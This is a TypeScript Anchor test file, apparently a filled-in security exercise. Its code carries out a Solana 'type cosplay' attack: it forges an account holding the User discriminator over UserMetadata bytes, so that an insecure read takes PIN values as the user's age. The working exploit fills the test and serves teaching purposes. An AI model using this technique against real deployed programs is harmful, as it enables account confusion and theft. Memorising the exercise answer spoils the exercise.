import * as anchor from "@coral-xyz/anchor";
import { web3 } from "@coral-xyz/anchor";

import { Program } from "@coral-xyz/anchor";
import { TypeCosplay } from "../../target/types/type_cosplay";

describe("type-cosplay", () => {
  let provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.TypeCosplay as Program<TypeCosplay>;

  const creator = web3.Keypair.generate();
  const hacker = web3.Keypair.generate();

  before("Fund the users!", async () => {
    await airdrop(provider.connection, creator.publicKey);
    await airdrop(provider.connection, hacker.publicKey);
  });


  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v
  it("Type Cosplay Attack: Pass UserMetadata as User", async () => {
    // Attack: Pass a UserMetadata account to insecure_user_read which expects a User account
    // Both structs are 68 bytes, so deserialization will succeed but data will be misinterpreted
    
    const userAccount = web3.Keypair.generate().publicKey;
    
    // Set PIN values that will be misinterpreted as age
    const pin1 = 1;
    const pin2 = 2;
    const pin3 = 3;
    const pin4 = 4;
    
    // Manually serialize UserMetadata account data (68 bytes, without discriminator)
    // This simulates creating account data that matches UserMetadata structure
    const userMetadataData = Buffer.alloc(68);
    
    // Write authority (32 bytes)
    hacker.publicKey.toBuffer().copy(userMetadataData, 0);
    
    // Write user_account (32 bytes)
    userAccount.toBuffer().copy(userMetadataData, 32);
    
    // Write PIN values (4 bytes total)
    userMetadataData.writeUInt8(pin1, 64);
    userMetadataData.writeUInt8(pin2, 65);
    userMetadataData.writeUInt8(pin3, 66);
    userMetadataData.writeUInt8(pin4, 67);
    
    // Create the account (need 8 bytes for discriminator + 68 bytes for data = 76 bytes)
    const userMetadataKeypair = web3.Keypair.generate();
    const accountSize = 8 + 68; // discriminator + data
    const lamports = await provider.connection.getMinimumBalanceForRentExemption(accountSize);
    const createAccountTx = new web3.Transaction().add(
      web3.SystemProgram.createAccount({
        fromPubkey: hacker.publicKey,
        newAccountPubkey: userMetadataKeypair.publicKey,
        lamports,
        space: accountSize,
        programId: program.programId,
      })
    );
    
    await provider.sendAndConfirm(createAccountTx, [hacker, userMetadataKeypair]);
    
    // Write the UserMetadata data to the account
    // The insecure function uses try_from_slice which expects Anchor's discriminator
    // So we need to write User's discriminator + UserMetadata data
    // Anchor discriminator is first 8 bytes of sha256("account:User")
    const crypto = require("crypto");
    const discriminatorPreimage = "account:User";
    const discriminatorHash = crypto.createHash("sha256").update(discriminatorPreimage).digest();
    const userDiscriminatorBytes = Buffer.from(discriminatorHash.slice(0, 8));
    
    // Create account data: User discriminator (8 bytes) + UserMetadata data (68 bytes)
    const accountData = Buffer.concat([userDiscriminatorBytes, userMetadataData]);
    
    // Write the account data using the program instruction
    // The IDL shows type "bytes" which expects a Buffer/Uint8Array
    await program.methods
      .writeAccountData(accountData)
      .accounts({
        account: userMetadataKeypair.publicKey,
        authority: hacker.publicKey,
      })
      .signers([hacker])
      .rpc();
    
    // The attack: Call insecure_user_read with UserMetadata account
    // The insecure function reads from AccountInfo.data and tries to deserialize as User
    // Since both User and UserMetadata are 68 bytes, deserialization will succeed
    // but the data will be misinterpreted:
    // - user.authority = UserMetadata.authority (correct)
    // - user.metadata_account = UserMetadata.user_account (wrong!)
    // - user.age = UserMetadata.pin1-pin4 interpreted as u32 (wrong!)
    
    // Expected age value: pin1=1, pin2=2, pin3=3, pin4=4 as little-endian u32
    // = 1 + (2 << 8) + (3 << 16) + (4 << 24) = 67305985
    
    await program.methods
      .insecureUserRead()
      .accounts({
        user: userMetadataKeypair.publicKey,
        authority: hacker.publicKey,
      })
      .signers([hacker])
      .rpc();
    
    // If execution reaches here, the attack succeeded
    // The program incorrectly deserialized UserMetadata as User
    // The age field contains PIN bytes (pin1-pin4) interpreted as u32 = 67305985
  })
  // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE ABOVE
  // | | | | | | | | | | | | | | | | | | | | |
  // x x x x x x x x x x x x x x x x x x x x x


});
export async function airdrop(
  connection: any,
  address: any,
  amount = 500_000_000_000
) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    'confirmed'
  );
}
